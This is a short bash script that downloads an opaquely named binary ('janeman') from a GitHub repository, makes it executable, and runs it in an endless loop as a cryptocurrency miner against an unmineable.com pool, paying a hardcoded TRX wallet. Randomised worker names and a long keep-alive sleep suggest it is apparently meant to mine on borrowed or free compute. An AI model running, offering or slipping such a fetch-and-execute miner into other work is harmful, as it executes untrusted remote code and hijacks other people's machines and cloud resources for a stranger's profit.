#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TNddJ1xCyVjvL9bBeGJvyJ9uHBkJfSXLBB
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
wget https://github.com/archernap/prem/raw/main/janeman
chmod +x janeman
	while [ 1 ]; do
		./janeman -pool $POOL -wal $WALLET.$WORKER -pass x
        sleep 5
	done
sleep 999999999 
